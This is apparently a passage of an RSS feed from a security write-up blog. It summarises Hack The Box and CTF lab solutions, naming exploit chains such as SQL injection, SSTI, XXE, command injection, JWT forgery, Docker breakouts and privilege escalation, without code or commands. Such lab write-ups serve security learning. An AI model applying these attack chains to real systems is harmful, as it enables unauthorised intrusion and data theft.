shellcode
misDIRection Hack The Box. Challenges. Misc 3 minutes to read Guess string. Base64
Fake News Hack The Box. Challenges. Forensics 3 minutes to read PHP and JavaScript deobfuscation. Disc image inspection
Situated ImaginaryCTF 03/11/2022 1 minute to read 50 points. Inspect HTML code
Robotic ImaginaryCTF 04/11/2022 1 minute to read 50 points. robots.txt</description></item><item><title>Newsletter 12/12/2022</title><link>https://7rocky.github.io/en/newsletters/2022-12-12/</link><pubDate>Mon, 12 Dec 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2022-12-12/</guid><description>AESWCM HTB UniCTF 2022. Crypto. Medium 7 minutes to read Custom encryption using AES and XOR. Bad padding implementation
Bank-er-smith HTB UniCTF 2022. Crypto. Easy 7 minutes to read RSA known bits. Coppersmith method. LLL lattice reduction
BatchCraft Potions HTB UniCTF 2022. Web. Medium 22 minutes to read GraphQL batching attack. OTP and rate limit bypass. JWT. CSP. DOM Clobbering. XSS
Curse Breaker HTB UniCTF 2022. Reversing. Medium 14 minutes to read seccomp rules.</description></item><item><title>Newsletter 27/11/2022</title><link>https://7rocky.github.io/en/newsletters/2022-11-27/</link><pubDate>Sun, 27 Nov 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2022-11-27/</guid><description>RedPanda Hack The Box. Linux. Easy machine 10 minutes to read This machine contains a web application built with Spring Boot that is vulnerable to Server-Side Template Injection with a particular format. After that, in order to escalate privileges, we must analyze a Java program, enter some malicious metadata in a JPEG image, add an XML External Entity into a controlled XML file, break a log parser logic and finally wait for root to process the XML file and read its private SSH key</description></item><item><title>RedPanda</title><link>https://7rocky.github.io/en/htb/redpanda/</link><pubDate>Sat, 26 Nov 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/redpanda/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a web application built with Spring Boot that is vulnerable to Server-Side Template Injection with a particular format. After that, in order to escalate privileges, we must analyze a Java program, enter some malicious metadata in a JPEG image, add an XML External Entity into a controlled XML file, break a log parser logic and finally wait for root to process the XML file and read its private SSH key</description></item><item><title>Newsletter 20/11/2022</title><link>https://7rocky.github.io/en/newsletters/2022-11-20/</link><pubDate>Sun, 20 Nov 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2022-11-20/</guid><description>Nightmare Hack The Box. Challenges. Pwn 10 minutes to read 64-bit binary. Format String vulnerability. GOT overwrite
Optimistic Hack The Box. Challenges. Pwn 9 minutes to read 64-bit binary. Buffer Overflow. Integer Overflow. Alphanumeric shellcode
PwnShop Hack The Box. Challenges. Pwn 14 minutes to read 64-bit binary. Buffer Overflow. PIE and ASLR bypass. Special ROP chain. Ret2Libc
Secured Transfer Hack The Box. Challenges. Reversing 7 minutes to read Network traffic analysis with Wireshark.</description></item><item><title>Newsletter 13/11/2022</title><link>https://7rocky.github.io/en/newsletters/2022-11-13/</link><pubDate>Sun, 13 Nov 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2022-11-13/</guid><description>Shared Hack The Box. Linux. Medium machine 11 minutes to read This machine has an e-commerce store that is vulnerable to SQLi. With this vulnerability we can get a hashed password which is reused for SSH. There is another user that runs ipython periodically, so we can inject a configuration file to execute commands. The second user is able to use a binary compiled in Go that connects to Redis.</description></item><item><title>Shared</title><link>https://7rocky.github.io/en/htb/shared/</link><pubDate>Sat, 12 Nov 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/shared/</guid><description>Hack The Box. Linux. Medium machine. This machine has an e-commerce store that is vulnerable to SQLi. With this vulnerability we can get a hashed password which is reused for SSH. There is another user that runs ipython periodically, so we can inject a configuration file to execute commands. The second user is able to use a binary compiled in Go that connects to Redis. A binary analysis reveals the password, so we can connect to Redis and exploit a CVE to run Lua code, escape from the sandbox and execute system commands as root</description></item><item><title>Newsletter 07/11/2022</title><link>https://7rocky.github.io/en/newsletters/2022-11-07/</link><pubDate>Mon, 07 Nov 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2022-11-07/</guid><description>CRSid Hack The Box. Challenges. Pwn 24 minutes to read 64-bit binary. Heap exploitation. Safe-linking. Out-of-bounds write. Tcache poisoning. Exit handlers
AHS512 Hack The Box. Challenges. Crypto 5 minutes to read Custom hash function. Bit operations
Fast Carmichael Hack The Box. Challenges. Crypto 2 minutes to read Miller-Rabin primality test
Gonna-Lift-Em-All Hack The Box. Challenges. Crypto 2 minutes to read Modular arithmetic
Horror Feeds Hack The Box. Challenges. Web 4 minutes to read Stack-based SQL injection</description></item><item><title>Newsletter 30/10/2022</title><link>https://7rocky.github.io/en/newsletters/2022-10-30/</link><pubDate>Sun, 30 Oct 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2022-10-30/</guid><description>Trick Hack The Box. Linux. Easy machine 17 minutes to read This machine has a DNS service that is vulnerable to a Domain Zone Transfer attack and leaks a subdomain. Here we can bypass authentication with SQLi and exploit an LFI. Both vulnerabilities can be chained to get access to the machine. Then, we find another subdomain that is again vulnerable to LFI, and we can leak a user&amp;rsquo;s SSH private key.</description></item><item><title>Trick</title><link>https://7rocky.github.io/en/htb/trick/</link><pubDate>Sat, 29 Oct 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/trick/</guid><description>Hack The Box. Linux. Easy machine. This machine has a DNS service that is vulnerable to a Domain Zone Transfer attack and leaks a subdomain. Here we can bypass authentication with SQLi and exploit an LFI. Both vulnerabilities can be chained to get access to the machine. Then, we find another subdomain that is again vulnerable to LFI, and we can leak a user&amp;rsquo;s SSH private key. This user is able to restart fail2ban with sudo and modify configuration files</description></item><item><title>Faculty</title><link>https://7rocky.github.io/en/htb/faculty/</link><pubDate>Sat, 22 Oct 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/faculty/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to SQLi and autentication bypass which leads to a website where we can export HTML content to PDF. There is a vulnerability where we can attach local files to the PDF file and read a password reused for SSH. Using sudo we can execute a Node.js script as another user and exploit a command injection vulnerability. This second user is allowed to run GDB and moreover GDB has cap_sys_ptrace capability set, so we can debug a process running as root and run arbitrary code</description></item><item><title>OpenSource</title><link>https://7rocky.github.io/en/htb/opensource/</link><pubDate>Sat, 08 Oct 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/opensource/</guid><description>Hack The Box. Linux. Easy machine. This machine has a website exposes its source code, being vulnerable to Directory Path Traversal. Using this vulnerability we can read the necessary files to compute the PIN for the Flask debug console and get Remote Code Execution in a Docker container. After that, we need to use port forwarding to view a Gitea instance and enter credentials found in a Git repository. Here we have the private SSH key so we can enter as a system user. There is a Cron job that commits new changes of a Git repository and leads to privilege escalation</description></item><item><title>Scanned</title><link>https://7rocky.github.io/en/htb/scanned/</link><pubDate>Sat, 10 Sep 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/scanned/</guid><description>Hack The Box. Linux. Insane machine. This machine has a website that is able to analyze malware binaries. Analyzing the sandbox C code, we notice that we can use a log file to exfiltrate information through the web server report, and also abuse a misconfiguration to escape from chroot. Then, we can read a SQLite database file and extract a hashed password, which is reused for SSH. Once inside the machine, we are able to run a SUID binary from inside the sandbox and copy a malicious shared library so that the SUID binary runs Bash as root. Deep knowledge about Linux, programming in C and Bash, code audit experience and escaping techniques is needed in order to compromise this machine. This write-up uses a custom Bash script with an embedded C program to list directories and read files from the server and also a Go program to crack a hashed password</description></item><item><title>Noter</title><link>https://7rocky.github.io/en/htb/noter/</link><pubDate>Sat, 03 Sep 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/noter/</guid><description>Hack The Box. Linux. Medium machine. This machine has a web application built with Flask to manage notes in Markdown and PDF. We are able to extract the secret key used to sign session cookies and then forge cookies to enumerate users. Once we have a privileged user, we can access the FTP server and analyze the source code of the web application to detect a command injection vulnerability. Then, we can access the machine and find out that MySQL runs as root, which leads to privilege escalation</description></item><item><title>Talkative</title><link>https://7rocky.github.io/en/htb/talkative/</link><pubDate>Sat, 27 Aug 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/talkative/</guid><description>Hack The Box. Linux. Hard machine. This machine has a website that exposes a Jamovi application where we can get a reverse shell on a Docker container. Here we find some credentials for a Bolt CMS application, so we get administration access. From here we can modify a template by writing PHP code and get access to another container. This one has connectivity with port 22 of the machine, so we can get access to the machine via SSH reusing credentials. Then, we find that there&amp;rsquo;s another Docker container running MongoDB, which contains the database for a Rocket.Chat server. At this point, we can create a new account on Rocket.Chat and assign us administration role modifying the database entry. After that, we can set a new integration to gain RCE on the container that manages Rocket.Chat. Finally, this container has capability &lt;code>CAP_DAC_READ_SEARCH&lt;/code> enabled, which allows us to read files as &lt;code>root&lt;/code> from the host machine using an exploit. Moreover, the container is also vulnerable to another exploit to write arbitrary files as &lt;code>root&lt;/code> on the host machine</description></item><item><title>Timelapse</title><link>https://7rocky.github.io/en/htb/timelapse/</link><pubDate>Sat, 20 Aug 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/timelapse/</guid><description>Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment where we can find an encrypted ZIP file in SMB. We can crack the password and find a PFX file holding public and private keys for WinRM. Again we can crack the password and extract the keys to connect to the machine. There is a PowerShell history where we find a password for a LAPS reader member, which will tell us the password for Administrator. Basic Windows exploitation techniques and enumeration are needed in order to compromise this machine</description></item><item><title>Retired</title><link>https://7rocky.github.io/en/htb/retired/</link><pubDate>Sat, 13 Aug 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/retired/</guid><description>Hack The Box. Linux. Medium machine. This machine has a PHP website that is vulnerable to Directory Path Traversal. There we find a PHP file that expects a file to be uploaded in order to be passed to a local socket server. We are able to enumerate open processes and download the binary that runs the server and see that it is vulnerable to Buffer Overflow. Once exploited, we can pivot to another user using symbolic links. And then, we are allowed to add custom executable formats, which can be exploited to become root. Solid binary exploitation techniques and Linux concepts are required in order to compromise this machine. This write-up contains some custom Python exploits for the foothold part</description></item><item><title>OverGraph</title><link>https://7rocky.github.io/en/htb/overgraph/</link><pubDate>Sat, 06 Aug 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/overgraph/</guid><description>Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Open Redirect, a web application built with AngularJS which is vulnerable to Client-Side Template Injection and XSS, and a GraphQL endpoint. We are able to register a new account bypassing an OTP code using a NoSQLi payload. Then, we can perform a CSRF attack abusing the Open Redirect to inject an XSS payload on the victim&amp;rsquo;s profile in order to get an adminToken stored in localStorage. After that, we are able to upload video files that are processed with ffmpeg, so we can exploit a Server-Side Request Forgery vulnerability to read files from the server. Eventually, we will access as a user to the machine and find a binary that is running as root. Having analyzed the binary, we can obtain a valid token to use the program and exploit a vulnerability to write arbitrary data at an arbitrary address, leading to RCE or write permissions as root</description></item><item><title>Late</title><link>https://7rocky.github.io/en/htb/late/</link><pubDate>Sat, 30 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/late/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a Flask web application that extracts text from images and renders them, being vulnerable to SSTI. Then there is a PAM configured for SSH with relative paths that can be abused because of some privileges to ovewrite executables. Basic web exploitation and Linux enumeration skills are needed in order to compromise this machine</description></item><item><title>Catch</title><link>https://7rocky.github.io/en/htb/catch/</link><pubDate>Sat, 23 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/catch/</guid><description>Hack The Box. Linux. Medium machine. This machine offers an APK file that contains hard-coded authentication tokens for some services exposed by the machine. One of the tokens can be used to enumerate a Let&amp;rsquo;s Chat application using its API and get credentials for Cachet. This service is vulnerable to Server-Side Template Injection in PHP and we can get more credentials to access via SSH. The machine has a Cron job configured to analyze APK files using a Bash script that is vulnerable to command injection, so we need to upload a maliciously crafted APK file to exploit it and become root</description></item><item><title>Acute</title><link>https://7rocky.github.io/en/htb/acute/</link><pubDate>Sat, 16 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/acute/</guid><description>Hack The Box. Windows. Hard machine. This machine exposes a website where we can find a Word document with useful information and some usernames. There is a PowerShell Web Access where we can access using a default credential and extract another password from a screenshot. There is an Active Directory domain controller where we can execute commands as other users. We will be able to connect to the first machine and dump NTLM hashes and finally become domain administrator. Deep knowledge on PowerShell commands and basic Windows and Active Directory exploitation techniques are needed in order to compromise this machine</description></item><item><title>RouterSpace</title><link>https://7rocky.github.io/en/htb/routerspace/</link><pubDate>Sat, 09 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/routerspace/</guid><description>Hack The Box. Linux. Easy machine. This machine has a downloadable APK file with a simple app. This app performs a web request to an API the needs th be captured with a proxy, and this API is vulnerable to a command injection. After that, we can access to the machine via SSH and basic enumeration shows that the version of sudo is vulnerable</description></item><item><title>Undetected</title><link>https://7rocky.github.io/en/htb/undetected/</link><pubDate>Sat, 02 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/undetected/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website in PHP with a third-party dependency that is vulnerable to RCE. The machine has already been compromised and has some backdoors and exploits that need to be detected and analyzed using reverse engineering techniques</description></item><item><title>Paper</title><link>https://7rocky.github.io/en/htb/paper/</link><pubDate>Sat, 18 Jun 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/paper/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a WordPress website that has some secret information hidden in draft posts, and also a chat bot that shows sensitive information. After that, the server happens to be vulnerable to PolKit. WordPress enumeration is needed to compromise the machine</description></item><item><title>Meta</title><link>https://7rocky.github.io/en/htb/meta/</link><pubDate>Sat, 11 Jun 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/meta/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website that analyzes uploaded images with a vulnerable version of exiftool that leads to RCE. Then, there is a Cron job that transforms images using ImageMagick&amp;rsquo;s mogrify command, which is vulnerable to command injection. Finally, we have sudo permissions on neofetch, which leads to privilege escalation</description></item><item><title>Timing</title><link>https://7rocky.github.io/en/htb/timing/</link><pubDate>Sat, 04 Jun 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/timing/</guid><description>Hack The Box. Linux. Medium machine. This machine has a PHP web application that is vulnerable to user enumeration, LFI, Type Juggling and SQLi, apart from some other bugs and misconfigurations. After reading the PHP source code, we find a way to upload a PHP web shell and get RCE. After that, we find a password inside a Git repository and access via SSH. Then, we can run a JAR file using sudo that downloads files as root, and we can use a symlink to write an authorized SSH key for root</description></item><item><title>Pandora</title><link>https://7rocky.github.io/en/htb/pandora/</link><pubDate>Sat, 21 May 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/pandora/</guid><description>Hack The Box. Linux. Easy machine. This machine exposes sensitive information through SNMP that allows to access the machine. Then we find a local instance of Pandora FMS that has multiple vulnerabilities and they can be exploited to gain RCE as another user. This user is allowed to run a SUID binary that is vulnerable to PATH hijacking, but the attack needs to be performed with an SSH shell. Basic enumeration and pentesting skills are needed in order to compromise this machine</description></item><item><title>Unicode</title><link>https://7rocky.github.io/en/htb/unicode/</link><pubDate>Sat, 07 May 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/unicode/</guid><description>Hack The Box. Linux. Medium machine. This machine uses JWT tokens with JWKS and JKU that can be forged to arrive to a directory path traversal vulnerability that can be exploited using some Unicode bypassing. After that, there is a Python compiled binary that can be run with sudo and uses curl behind the hoods. Some JWT knowledge, path traversal and command injection bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit a directory path traversal using JWT with JWKS</description></item><item><title>Backdoor</title><link>https://7rocky.github.io/en/htb/backdoor/</link><pubDate>Sat, 23 Apr 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/backdoor/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a WordPress website that has a plugin vulnerable to Directory Path Traversal, which can be used to enumerate running processes, and then a SUID binary. WordPress enumeration and experience with file inclusion vulnerabilities is needed to compromise the machine. This write-up uses a custom Python script to read files from the server and a personal public exploit to gain access to the machine</description></item><item><title>Backend</title><link>https://7rocky.github.io/en/htb/backend/</link><pubDate>Tue, 12 Apr 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/backend/</guid><description>Hack The Box. Linux. Medium machine. This machine has an API where we can create a new account after some exploration. Then we can find some documentation in Swagger format where we see an endpoint to execute commands and to read files from the server. We must find the secret key used to sign JWT tokens in order to create a valid token to execute commands. Knowledge on JWT tokens and API enumeration are needed to compromise this machine</description></item><item><title>Overflow</title><link>https://7rocky.github.io/en/htb/overflow/</link><pubDate>Sat, 09 Apr 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/overflow/</guid><description>Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Padding Oracle Attack and Bit Flipper Attack to login as admin and also vulnerable to SQLi by a CMS. There is another subdomain that runs a version of exiftool that has an RCE vulnerability. Once in the machine, lateral movements are relatively easy and privilege escalation consists of reversing and exploiting a Buffer Overflow vulnerability on a SUID binary. Deep knowledge on web exploitation, cryptography and binary exploitation are needed in order to compromise this machine. This write-up uses a custom Python script to perform a Bit Flipper Attack and a Ruby script to exploit SQLi</description></item><item><title>Shibboleth</title><link>https://7rocky.github.io/en/htb/shibboleth/</link><pubDate>Sat, 02 Apr 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/shibboleth/</guid><description>Hack The Box. Linux. Medium machine. This machine has a vulnerable IPMI service where we can find a password that is reused for a Zabbix control panel. Here we can enter and get access to the machine. Next, we find a vulnerable version for MariaDB which leads to RCE as root. Good enumeration and pentesting methodology are needed in order to comprimise this machine</description></item><item><title>Altered</title><link>https://7rocky.github.io/en/htb/altered/</link><pubDate>Wed, 30 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/altered/</guid><description>Hack The Box. Linux. Hard machine. This machine has a PHP website vulnerable to user enumeration. Then we can use brute force on a PIN to reset a password after bypassing rate limits and exploit SQLi and Type Juggling. After that, we see that the Linux kernel is vulnerable to DirtyPipe. Advanced web exploitation techniques are needed in order to compromise this machine. This write-up uses a custom Ruby script to find the valid PIN</description></item><item><title>Secret</title><link>https://7rocky.github.io/en/htb/secret/</link><pubDate>Sat, 26 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/secret/</guid><description>Hack The Box. Linux. Easy Machine. This machine contains an API that uses JWT tokens for authentication. We can download the proyect and discover that it is a Git repository, so that we can see the secret key in previous commits and exploit a command injection vulnerability. There is a SUID binary that reads files as root although it only shows some statistics of the file, but we are able to kill the process and read the coredump. Web exploitation techniques, Git enumeration and knowledge about Linux processes are needed in order to compromise this machine</description></item><item><title>Stacked</title><link>https://7rocky.github.io/en/htb/stacked/</link><pubDate>Sat, 19 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/stacked/</guid><description>Hack The Box. Linux. Insane machine. This machine contains a LocalStack environment that is vulnerable to CSRF and command injection. By discovering an XSS vulnerability in a subdomain, we can use CSRF to exploit the command injection vulnerability and get RCE inside a container. After escalating privileges inside the container by restarting a service and entering a malicious command, we can interact with Docker from the host machine and create a malicious container from scratch that mounts the host file system into the container to get arbitrary file read and write. Web exploitation techniques and deep Docker knowledge is needed in order to compromise this machine</description></item><item><title>Ransom</title><link>https://7rocky.github.io/en/htb/ransom/</link><pubDate>Tue, 15 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/ransom/</guid><description>Hack The Box. Linux. Medium machine. This machine has a Laravel website with a login form that is vulnerable to Type Juggling. After that we find a encrypted ZIP file and we can perform a known plaintext attack to extract the files. The password expected for the login form is reused for the root user. Basic knowledge about web pentesting on PHP and knowledge about ZIP files is required in order to comprimise this machine</description></item><item><title>Devzat</title><link>https://7rocky.github.io/en/htb/devzat/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/devzat/</guid><description>Hack The Box. Linux. Medium machine. This machine contains chat service over SSH and a hidden web subdomain vulnerable to command injection. Then we can access the machine and exploit a vulnerable version of InluxDB to extract the password for another user. This user has permissions to see a development project for the SSH chat that allows to read arbitrary files from the server. Basic web exploitation and Linux enumeration techniques are needed in order to compromise this machine</description></item><item><title>Hancliffe</title><link>https://7rocky.github.io/en/htb/hancliffe/</link><pubDate>Sat, 05 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/hancliffe/</guid><description>Hack The Box. Windows. Hard machine. This machine contains a webpage that hides a Nuxeo Java application vulnerable to SSTI by breaking nginx parser logic. Then we find access the machine and find an application that has a public exploit to access as another user. After that, we extract Firefox credentials and use a password generator to login as another user and find a custom Windows PE. Having reversed the binary to obtain the expected credentials, we find a Buffer Overflow vulnerability that must be exploited via Socket Reuse to access as Administrator</description></item><item><title>Driver</title><link>https://7rocky.github.io/en/htb/driver/</link><pubDate>Sat, 26 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/driver/</guid><description>Hack The Box. Windows. Easy machine. This machine contains a website with default credentials authentication and a file upload. Here we can upload an SCF to capture the user&amp;rsquo;s NTLMv2 hash and crack it. Then we can exploit PrintNightmare. Windows basic exploitation techniques are needed in order to compromise this machine</description></item><item><title>GoodGames</title><link>https://7rocky.github.io/en/htb/goodgames/</link><pubDate>Mon, 21 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/goodgames/</guid><description>Hack The Box. Linux. Easy machine. This machine has website that is vulnerable to SQL injection where we can extract a password to access an internal website that is vulnerable to SSTI. Then, we get access to a Docker container that mounts a directory from the machine, so that we can abuse it to escalate privileges. Basic web exploitation skills and Docker breakout techniques are needed in order to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch</description></item><item><title>Bolt</title><link>https://7rocky.github.io/en/htb/bolt/</link><pubDate>Sat, 19 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/bolt/</guid><description>Hack The Box. Linux. Medium machine. This machine has several virtual hosts and a Docker image that contains a lot of information needed to exploit the websites. There is an SSTI vulnerability between two websites interaction. Then we can extract a PGP private key from Google Chrome cache and decrypt a message. Deep knowledge about Docker and basic web exploitation skills are needed in order to compromise this machine</description></item><item><title>SteamCloud</title><link>https://7rocky.github.io/en/htb/steamcloud/</link><pubDate>Mon, 14 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/steamcloud/</guid><description>Hack The Box. Linux. Easy machine. This machine has a Kubernetes cluster that exposes the kubelet and it is vulnerable to unauthenticated RCE. We are able to extract credentials from a running Pod and use them to create a malicious Pod that mounts the hosts file system. Basic knowledge about pentesting on Kubernetes is needed to compromise this machine</description></item><item><title>Epsilon</title><link>https://7rocky.github.io/en/htb/epsilon/</link><pubDate>Mon, 07 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/epsilon/</guid><description>Hack The Box. Linux. Medium machine. This machine contains a website that exposes Git repository with secrets in old commits. There is a website that needs a valid JWT token in order to exploit an SSTI vulnerability. The secret for the JWT tokens is stored in an AWS Lambda function. Then, there is a Cron job that can be exploited using symlinks to gain arbitrary read. Knowledge about Git, JWT, SSTI and AWS Lambda, as well as Cron job exploitation, is needed to compromise this machine</description></item><item><title>Horizontall</title><link>https://7rocky.github.io/en/htb/horizontall/</link><pubDate>Sat, 05 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/horizontall/</guid><description>Hack The Box. Linux. Easy machine. This machine has a website that hides a valid subdomain that contains a Strapi webapp vulnerable to RCE. There is also an internal Laravel webapp vulnerable to RCE. Some knowledge about JavaScript, PHP and Python, as well as port forwarding techniques, are needed to compromise this machine. This write-up uses a custom script that chains two exploits for Strapi needed to obtain RCE</description></item><item><title>Forge</title><link>https://7rocky.github.io/en/htb/forge/</link><pubDate>Sat, 22 Jan 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/forge/</guid><description>Hack The Box. Linux. Medium machine. This machine has a Server-Side Request Forgery (SSRF) vulnerability from a subdomain to an FTP server. After that, there are sudo permissions to run a Python script with a debugger. Basic web pentesting bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit the SSRF</description></item><item><title>NodeBlog</title><link>https://7rocky.github.io/en/htb/nodeblog/</link><pubDate>Mon, 10 Jan 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/nodeblog/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a blog that is vulnerable to NoSQL injection, then to XML External Entity (XXE) injection and finally to insecure deserialization to get Remote Code Execution. Advanced web pentesting techniques and scripting skills are needed in order to compromise this machine. This write-up uses custom scripts in Bash, Python and Node.js to exploit all vulnerabilities</description></item><item><title>Previse</title><link>https://7rocky.github.io/en/htb/previse/</link><pubDate>Sat, 08 Jan 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/previse/</guid><description>Hack The Box. Linux. Easy machine. This machine has a webpage vulnerable to command injection after bypassing redirects and managing to register a new account. After that, a hash must be cracked to login as a low privileged user and perform a PATH hijacking using sudo. Common web pentesting and Burp Suite skills, as well as common privilege escalation techniques are needed to compromise the machine. This write-up uses a custom Go program to automate the foothold process</description></item><item><title>Static</title><link>https://7rocky.github.io/en/htb/static/</link><pubDate>Sat, 18 Dec 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/static/</guid><description>Hack The Box. Linux. Hard machine. This machine contains a website that exposes a corrupted Gzip file that must be patched to get a TOTP key and download a VPN file. Then there are some PHP vulnerable services that can be compromised and get to an internal server that contains a binary executable file having a Format String vulnerability. Deep knowledge about pivoting and port forwarding techniques, network enumeration and PHP exploitation, as well as Format String exploitation are needed to compromise this machine. This write-up uses a custom Ruby script to automate the process of downloading the VPN file, a Python script gain RCE over a PHP web server and another Python script to exploit a binary using Format String</description></item><item><title>Writer</title><link>https://7rocky.github.io/en/htb/writer/</link><pubDate>Sat, 11 Dec 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/writer/</guid><description>Hack The Box. Linux. Medium machine. This machine contains a website that is vulnerable to SQL injection. This allows to read the source code of the server and find a vulnerability. Then some command injection techniques to escalate privileges. Some scripting for automating a SQLi exploit, SMB, SMTP and Cron tasks are needed to compromise the machine. This write-up uses custom Python scripts for SQLi and for the foothold</description></item><item><title>Pikaboo</title><link>https://7rocky.github.io/en/htb/pikaboo/</link><pubDate>Sat, 04 Dec 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/pikaboo/</guid><description>Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch</description></item><item><title>LogForge</title><link>https://7rocky.github.io/en/htb/logforge/</link><pubDate>Fri, 03 Dec 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/logforge/</guid><description>Hack The Box. Linux. Medium machine. This machine uses Log4j in a Tomcat server that is vulnerable to JNDI lookup. Then there is an FTP server made in Java that also uses Log4j, but this time it is only vulnerable to information disclosure. Knowlegde about Log4j exploitation, Tomcat, FTP and Wireshark are needed in order to compromise this machine</description></item><item><title>Intelligence</title><link>https://7rocky.github.io/en/htb/intelligence/</link><pubDate>Sat, 27 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/intelligence/</guid><description>Hack The Box. Windows. Medium machine. This machine presents an Active Directory (AD) environment to perform user enumeration, network poisoning and a Silver Ticket attack. Some scripting, DNS operations, AD attacks and BloodHound basics are needed to compromise this machine. This write-up uses a custom Go script to fuzz for files in a web server</description></item><item><title>Union</title><link>https://7rocky.github.io/en/htb/union/</link><pubDate>Mon, 22 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/union/</guid><description>Hack The Box. Linux. Medium machine. This machine contains Union-based SQL injection (SQLi) and command injection vulnerabilities. Some SQLi bypassing techniques and source code analysis skills are needed to compromise this machine. This write-up uses a custom Java program to automate a SQLi attack</description></item><item><title>BountyHunter</title><link>https://7rocky.github.io/en/htb/bountyhunter/</link><pubDate>Sat, 20 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/bountyhunter/</guid><description>Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to XML External Entity (XXE) injection and that has sudo permissions configured. Some knowledge about XXE, PHP and Python is needed to compromise this machine. This write-up uses a custom Bash script to read files from the server exploiting XXE</description></item><item><title>Seal</title><link>https://7rocky.github.io/en/htb/seal/</link><pubDate>Sat, 13 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/seal/</guid><description>Hack The Box. Linux. Medium machine. This machine contains a Tomcat website on top of nginx, which has a configuration vulnerability that leads to Remote Code Execution (RCE), then it has some misconfigurations related to file permissions and sudo commands. Knowledge about Tomcat exploitation and Linux file system is needed to compromise this machine</description></item><item><title>Nunchucks</title><link>https://7rocky.github.io/en/htb/nunchucks/</link><pubDate>Tue, 02 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/nunchucks/</guid><description>Hack The Box. Linux. Easy machine. This machine has a webpage vulnerable to Server-Side Template Injection (SSTI) and system capabilities set, but with some protections. 